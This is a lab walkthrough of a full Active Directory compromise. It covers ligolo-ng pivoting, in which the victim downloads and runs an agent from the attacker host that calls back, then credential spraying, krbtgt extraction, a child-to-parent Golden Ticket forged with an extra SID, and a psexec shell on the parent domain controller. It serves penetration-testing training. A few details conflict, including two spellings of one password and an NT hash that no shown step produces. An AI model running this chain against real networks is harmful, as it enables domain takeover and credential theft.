By this point of the engagement we know there is a possible point of access into an internal network. Our external engagement left us with a set of credentials and a internal facing interface.

A set of credentials in plain text.
```
http://192.168.98.30/admin/index.php?user=john@child.warfare.corp&pass=User1@#$%6|||1737028407427000|1737029666390000|tuXr2pTr03P2|1|7
```
Some important information we get from our linpeas scan not involving vulnerabilities.
```
                              ╔═════════════════════╗
══════════════════════════════╣ Network Information ╠══════════════════════════════
                              ╚═════════════════════╝
╔══════════╣ Interfaces
# symbolic names for networks, see networks(5) for more information
link-local 169.254.0.0
ens32: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.80.10  netmask 255.255.255.0  broadcast 192.168.80.255
        ether 00:50:56:96:17:f9  txqueuelen 1000  (Ethernet)
        RX packets 152365  bytes 176914936 (176.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 125048  bytes 19022214 (19.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens34: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.98.15  netmask 255.255.255.0  broadcast 192.168.98.255
        ether 00:0c:29:28:1b:7e  txqueuelen 1000  (Ethernet)
        RX packets 8924  bytes 2918390 (2.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10163  bytes 2226934 (2.2 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
        device interrupt 16  base 0x1000  

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 13972  bytes 4745588 (4.7 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 13972  bytes 4745588 (4.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

# Configuring Ligolo

On our attacking host we will be downloading ligolo, both the agent and the proxy
```
#Proxy  
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz


#Agent  
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
```
## Setting up proxy in attacking machine
After installing this so:
```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $sudo ip tuntap add user notconcerned mode tun ligolo
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $ip route
default via 192.168.137.2 dev ens33 proto dhcp src 192.168.137.145 metric 100 
10.10.200.0/24 dev tun0 proto kernel scope link src 10.10.200.206 
10.89.0.0/24 dev podman1 proto kernel scope link src 10.89.0.1 
192.168.80.0/24 via 10.10.200.1 dev tun0 
192.168.98.0/24 via 10.10.200.1 dev tun0 
192.168.137.0/24 dev ens33 proto kernel scope link src 192.168.137.145 metric 100 
```

We can then delete our current tun0 interface torwards the internal ip range:
```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $sudo ip route del 192.168.98.0/24 dev tun0
```
Set up a link with our new ligolo interface
```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $sudo ip link set ligolo up
```

And re-add the 192.168.98.0/24 internal IP range to our new ligolo interface:
```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $sudo ip route add 192.168.98.0/24 dev ligolo
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $ip route
default via 192.168.137.2 dev ens33 proto dhcp src 192.168.137.145 metric 100 
10.10.200.0/24 dev tun0 proto kernel scope link src 10.10.200.206 
10.89.0.0/24 dev podman1 proto kernel scope link src 10.89.0.1 
192.168.80.0/24 via 10.10.200.1 dev tun0 
192.168.98.0/24 dev ligolo scope link linkdown 
192.168.137.0/24 dev ens33 proto kernel scope link src 192.168.137.145 metric 100 
```

We can then start the ligolo proxy server on the Attacking machine
```bash
┌─[✗]─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $sudo ./proxy -selfcert -laddr 0.0.0.0:443  
WARN[0000] Using automatically generated self-signed certificates (Not recommended) 
INFO[0000] Listening on 0.0.0.0:443                     
    __    _             __                       
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ / 
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /  
        /____/                          /____/   

Made in France ♥ by @Nicocha30!

ligolo-ng »  

```

## Setting up agent in victim machine (privilege@192.168.80.10)
Transfer the agent to the victim machine & start the connection

Set up a python server on attacking machine
```bash
python -m http.server 8000
```

Curl the agent from the victim machine
```bash
privilege@ubuntu-virtual-machine:~$ curl http://10.10.200.206:8000/agent -o agent
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 4396k  100 4396k    0     0   255k      0  0:00:17  0:00:17 --:--:--  291k

```


Run the agent. Replace this with your attacker IP address.  
```bash
privilege@ubuntu-virtual-machine:~$ sudo ./agent -connect 10.10.200.206:443 -ignore-cert 
WARN[0000] warning, certificate validation disabled     
INFO[0000] Connection established                        addr="10.10.200.206:443" 
```

Our serverside attacking machine shows the connection:
```bash
igolo-ng » INFO[0632] Agent joined.                                 name=root@ubuntu-virtual-machine remote="192.168.80.10:36306"
ligolo-ng » session
? Specify a session :  [Use arrows to move, type to filter]
> 1 - root@ubuntu-virtual-machine - 192.168.80.10:36306

```

With this setup done, we can start up a tunnal and reach our new internal host from our attacking machine:
```bash
[Agent : root@ubuntu-virtual-machine] » start
[Agent : root@ubuntu-virtual-machine] » INFO[1188] Starting tunnel to root@ubuntu-virtual-machine 
```

# Enumeration
We will start with a basic enumeration through our internal range

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $nmap -sn 192.168.98.0/24
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-01-25 20:14 EST
Nmap scan report for 192.168.98.2
Host is up (0.61s latency).
Nmap scan report for 192.168.98.15
Host is up (0.19s latency).
Nmap scan report for 192.168.98.30
Host is up (0.22s latency).
Nmap scan report for 192.168.98.120
Host is up (0.36s latency).
Nmap done: 256 IP addresses (4 hosts up) scanned in 27.04 seconds
```

The Nmap scan gave us some odd results, suggesting every IP in the range was up with suspiciously low latency. To filter out the noise and get an accurate list of live hosts, we will switch to `fping`.

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $sudo fping -a -q -g 192.168.98.0/24 2>/dev/null
192.168.98.2
192.168.98.15
192.168.98.30
192.168.98.120

```

# Accessing Internal Services

We previously recovered a set of credentials for the user `john` pointing to `192.168.98.30`. Now that we have confirmed the host is alive, we can focus our enumeration there.

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $nmap -p- --open -n --max-retries 5000 -sS -vvv -Pn 192.168.98.30 -oG allPorts

```

The scan reveals several open ports, including SMB (139, 445) and RPC (135). With ports open and credentials in hand (`john` : `User1@#$%6`), we can try to enumerate SMB shares using `CrackMapExec`. Snipped logs to concentrate of our entry point.

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $crackmapexec --verbose smb 192.168.98.30 -u john -p 'User1@#$%6' --lsa
SMB         192.168.98.30   445    MGMT             [*] Windows 10.0 Build 17763 x64 (name:MGMT) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.30   445    MGMT             [+] child.warfare.corp\john:User1@#$%6 (Pwn3d!)

```

With this, we have found our entry point through this machine. Digging deeper into the system, we find another set of cleartext credentials, this time for a user named `corpmngr`.
```bash
SMB         192.168.98.30   445    MGMT              corpmngr@child.warfare.corp:User4&*&
```

**Credentials Found:**

* User: `corpmngr@child.warfare.corp`
* Password: `User4&*&`

# Lateral Movement & Domain Escalation

We need to see where this `corpmngr` user has access. We will spray these new credentials across the alive hosts we discovered earlier to check for privileges.

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $crackmapexec --verbose smb 192.168.98.120 -u corpmngr -p 'User4&*&' --lsa
SMB         192.168.98.120  445    CDC              [*] Windows Server 2019 Build 17763 x64 (name:CDC) (domain:child.warfare.corp) (signing:False) (SMBv1:False)
SMB         192.168.98.120  445    CDC              [+] child.warfare.corp\corpmngr:User4&*& (Pwn3d!)

```

It looks like `corpmngr` is a Local Administrator on `192.168.98.120`, which appears to be the Child Domain Controller (CDC).
This type of trust relationship means authentication requests can flow between domains, while Security Identifiers from one domain may be respected into the other domain.

[Attacking Domain Trusts - Child -> Parent Trusts - from Windows Blog](https://notes.cavementech.com/pentesting-quick-reference/active-directory/domain-trusts/attacking-domain-trusts-child-greater-than-parent-trusts-from-windows)

With this access to the child domain we have positiones ourselves to leverage this trust relationship to attack the parent domain, warfare.corp.

## Preparing for Domain Trust Abuse

We have discovered a Parent-Child domain relationship. To proceed with attacks against the domain structure, we need to ensure our attacking machine can resolve the domain names properly. We will add the Parent (`warfare.corp`) and Child (`child.warfare.corp`) domain controllers to our `/etc/hosts` file.

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $echo "192.168.98.2 warfare.corp dc01.warfare.corp" | sudo tee -a /etc/hosts
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/EPT]
└──╼ $echo "192.168.98.120 child.warfare.corp cdc.child.warfare.corp" | sudo tee -a /etc/hosts

```

## Extracting Key Material

Since we have administrative access to the Child DC, we can dump the hashes. Specifically, we are interested in the `krbtgt` hash. This account signs the Kerberos tickets, and possessing it allows us to forge our own tickets.

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $impacket-secretsdump -debug child/corpmngr:'User4&*&*'@cdc.child.warfare.corp -just-dc-user 'child\krbtgt'
...
krbtgt:aes256-cts-hmac-sha1-96:ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2
...

```

To forge a "Golden Ticket" that allows us to cross from the Child domain to the Parent domain, we need to abuse the SID History attribute. For this, we need the Security Identifiers (SIDs) of both domains.

```bash
# Get Child Domain SID
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $impacket-lookupsid child/corpmngr:'User4&*&*'@child.warfare.corp
[*] Domain SID is: S-1-5-21-3754860944-83624914-1883974761

# Get Parent Domain SID
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $impacket-lookupsid child/corpmngr:'User4&*&*'@warfare.corp
[*] Domain SID is: S-1-5-21-3375883379-808943238-3239386119

```

# The Golden Ticket Attack

We now have all the ingredients:

1. **krbtgt AES256:** `ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2`
2. **Child SID:** `S-1-5-21-3754860944-83624914-1883974761`
3. **Parent SID:** `S-1-5-21-3375883379-808943238-3239386119`

We will use `impacket-ticketer` ([ticketer.py in impacket repository](https://github.com/fortra/impacket/blob/master/examples/ticketer.py)) to create a Golden Ticket. Crucially, we will inject the Parent Domain's SID into the `extra-sid` field with the group ID `516` (Domain Admins). This convinces the Parent DC that we are administrators.

A quick reference on what each of this parameters/flags do when ran with the ticketer can be found here > [Attacking Domain Trusts - Child -> Parent Trusts - from Linux, Better Way To Do It](https://notes.cavementech.com/pentesting-quick-reference/active-directory/domain-trusts/attacking-domain-trusts-child-greater-than-parent-trusts-from-linux#better-way-to-do-it)

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $impacket-ticketer -domain child.warfare.corp \
       -aesKey ad8c273289e4c511b4363c43c08f9a5aff06f8fe002c10ab1031da11152611b2 \
       -domain-sid S-1-5-21-3754860944-83624914-1883974761 \
       -groups 516 \
       -user-id 1106 \
       -extra-sid S-1-5-21-3375883379-808943238-3239386119-516,S-1-5-9 \
       'corpmngr'

```

With the ticket created (`corpmngr.ccache`), we export it to our environment variable so our tools can use it for authentication.

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $export KRB5CCNAME=corpmngr.ccache

```

Next, we request Ticket Granting Service specifically for the Parent Domain Controller (`dc01.warfare.corp`).

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $impacket-getST -spn 'CIFS/dc01.warfare.corp' -k -no-pass child.warfare.corp/corpmngr -debug

```

We update our environment variable to use this new service ticket.

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $export KRB5CCNAME=corpmngr@CIFS_dc01.warfare.corp@WARFARE.CORP.ccache

```

# Parent Domain Compromise

With a valid ticket for the Parent DC, we can finally dump the Administrator's hashes from the parent domain.

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $impacket-secretsdump -k -no-pass dc01.warfare.corp -just-dc-user 'warfare\Administrator'
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:ca1d92ce23046a58b1cec292376a7d3ec6de02176bf44fb50fede1db46fec183
...

```

Finally, we can use these hashes to get a full shell on the Parent Domain Controller using `psexec`.

```bash
┌─[notconcerned@parrot]─[~/Documents/CRTA-LAB/IPT/tools]
└──╼ $impacket-psexec -debug 'warfare/Administrator@dc01.warfare.corp' -hashes :a2f7b77b62cd97161e18be2ffcfdfd60
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Impacket Library Installation Path: /usr/lib/python3/dist-packages/impacket
[*] StringBinding ncacn_np:dc01.warefare.corp[\pipe\svcctl]
[*] Requesting shares on dc01.warfare.corp.....
[*] Found writable share ADMIN$
[*] Uploading file....
[*] Opening SVCManager on dc01.warfare.corp.....
[*] Creating service....
[*] Starting service....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
warfare\administrator

```

We have successfully compromised the entire forest, moving from a web vulnerability to Child Domain Admin, and finally to Enterprise/Parent Domain Admin.